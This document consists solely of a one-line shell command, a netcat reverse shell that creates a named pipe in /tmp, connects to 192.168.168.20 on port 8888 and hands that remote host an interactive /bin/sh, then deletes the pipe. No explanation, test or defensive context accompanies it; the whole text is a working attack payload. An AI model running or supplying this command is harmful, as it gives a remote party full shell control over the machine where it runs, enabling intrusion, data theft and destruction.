mkfifo /tmp/dpnvul; nc 192.168.168.20 8888 0</tmp/dpnvul | /bin/sh >/tmp/dpnvul 2>&1; rm /tmp/dpnvul
